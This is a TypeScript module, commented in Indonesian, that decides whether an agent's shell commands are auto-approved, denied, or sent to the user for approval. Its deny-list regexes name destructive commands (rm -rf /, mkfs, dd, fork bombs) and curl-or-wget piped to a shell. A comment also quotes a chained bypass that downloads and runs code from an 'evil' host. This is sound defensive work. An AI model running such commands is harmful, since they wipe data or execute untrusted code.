// ============================================================================
// ANT — Shell Allowlist Gatekeeper (Fase 4E, hardened Fase 2)
// ============================================================================
// Keputusan 3 arah:
//   true              → auto-approve (aman, tanpa interaksi user)
//   false             → hard deny (pola destruktif, TIDAK bisa di-approve)
//   'manual_approval' → butuh konfirmasi user [y/n/a]
//
// Prinsip hardening (Fase 2):
//   1. DENY dulu, baru allow (fail-closed).
//   2. Metachar guard: command yang mengandung operator chaining/substitusi/
//      redirection TIDAK PERNAH auto-approve — paling banter manual approval.
//      Ini menutup bypass klasik: `npm install x && curl evil | sh`,
//      backtick/$() substitution, `>` overwrite, newline smuggling, NUL byte.
//   3. Prefix matching pakai token boundary — "npm install" tidak lagi
//      mencocokkan "npm install-evil" (bypass lama).
//   4. Deny list case-insensitive & tahan variasi flag (rm -fr, rm -Rf, dst).
//
// Catatan arsitektur: pertahanan utama jangka panjang adalah menghindari
// shell sama sekali (spawn(cmd, argsArray, { shell: false })) di shell_ops.
// Modul ini tetap diperlukan sebagai policy layer untuk jalur yang memang
// harus lewat shell (pipe legit, dll) — di sana grammar metachar di bawah
// adalah contract minimal yang wajib dipenuhi.

export const DEFAULT_ALLOWED_PREFIXES = [
  "npm run", "npm test", "npm ci", "npm install",
  "npx", "node", "git status", "git log", "git diff", "git add", "git commit",
  "tsc", "ls", "cat", "echo", "pwd", "grep", "find", "mkdir", "touch"
];

// ── HARD DENY LIST (case-insensitive, dievaluasi sebelum allowlist) ─────────
export const DENIED_PATTERNS: RegExp[] = [
  // rm rekursif+force menargetkan root, home, glob, atau $HOME
  // (mencakup rm -rf /, rm -fr /, rm -Rf ~, rm -rf /*, rm -rf $HOME)
  /\brm\b[^;&|<>]*\s+-[a-zA-Z]*[rR][a-zA-Z-]*\s+(?:--\s+)?["']?(?:\/[\s"']*|\/\*|~(?:\/[\s"']*)?|\*(?:\s|$)|\$HOME)/i,
  // format / tulis disk mentah
  /\bmkfs(?:\.\w+)?\b/i,
  /\bdd\b\s+if=/i,
  // pipe ke interpreter (curl|sh, wget|bash, base64 -d|sh, dst)
  /\b(?:curl|wget|base64)\b[^;&]*\|\s*(?:sh|bash|zsh|python\d?|perl|node)\b/i,
  // remote script execution via -c/-o pipe
  /\b(?:curl|wget)\b[^;&]*\|\s*(?:sudo\s+)?(?:sh|bash)\b/i,
  // chmod rekursif 777 pada root
  /\bchmod\b[^;&|<>]*\s+-[a-zA-Z]*R[a-zA-Z]*\s+777\s+\/(?:\s|$)/i,
  // kontrol daya / sistem
  /\b(?:shutdown|reboot|halt|poweroff|init\s+0|init\s+6)\b/i,
  // redirect ke device node
  />\s*\/dev\/(?:sd[a-z]|nvme|disk|hd[a-z])/i,
  // fork bomb
  /:\(\)\s*\{[^}]*\};\s*:/,
];

// ── METACHAR GUARD ───────────────────────────────────────────────────────────
// Karakter/operator yang memberi kekuatan eksekusi tambahan pada shell.
// Command yang memuatnya TIDAK PERNAH auto-approve.
//   ;  &  |  `  $()  ${}  <  >  newline  carriage-return  NUL
const SHELL_METACHAR_REGEX = /[;&|`<>\n\r\u0000]|\$\(|\$\{/;

export interface ShellDecision {
  decision: 'allowed' | 'denied' | 'manual_approval';
  reason?: string;
}

/**
 * Evaluasi kebijakan shell secara kaya (untuk logging & test).
 * Urutan: deny list → metachar guard → allowlist prefix → fallback manual.
 */
export function evaluateShellCommand(command: string, profileAllowedPrefixes: string[] = []): ShellDecision {
  const normalizedCmd = command.trim();

  if (!normalizedCmd) {
    return { decision: 'manual_approval', reason: 'empty command' };
  }

  // 1. Hard deny — selalu menang, tidak bisa di-approve user.
  for (const pattern of DENIED_PATTERNS) {
    if (pattern.test(normalizedCmd)) {
      return { decision: 'denied', reason: `matches deny pattern: ${pattern}` };
    }
  }

  // 2. Metachar guard — chaining/substitusi/redirection tidak pernah auto.
  const metachar = normalizedCmd.match(SHELL_METACHAR_REGEX);
  if (metachar) {
    return {
      decision: 'manual_approval',
      reason: `shell metacharacter detected: ${JSON.stringify(metachar[0])}`
    };
  }

  // 3. Allowlist prefix dengan token boundary.
  const combinedAllowlist = [...DEFAULT_ALLOWED_PREFIXES, ...profileAllowedPrefixes];
  for (const prefix of combinedAllowlist) {
    if (normalizedCmd === prefix || normalizedCmd.startsWith(prefix + ' ') || normalizedCmd.startsWith(prefix + '\t')) {
      return { decision: 'allowed' };
    }
  }

  // 4. Fallback — butuh persetujuan manual.
  return { decision: 'manual_approval', reason: 'not in allowlist' };
}

/**
 * API kompatibel dengan versi lama (dipakai permissions.ts).
 * Returns true if allowed automatically (no manual approval needed).
 * Returns false if explicitly blocked (denied).
 * Returns 'manual_approval' if it needs user confirmation.
 */
export function isShellCommandAllowed(command: string, profileAllowedPrefixes: string[] = []): boolean | 'manual_approval' {
  const { decision } = evaluateShellCommand(command, profileAllowedPrefixes);
  if (decision === 'allowed') return true;
  if (decision === 'denied') return false;
  return 'manual_approval';
}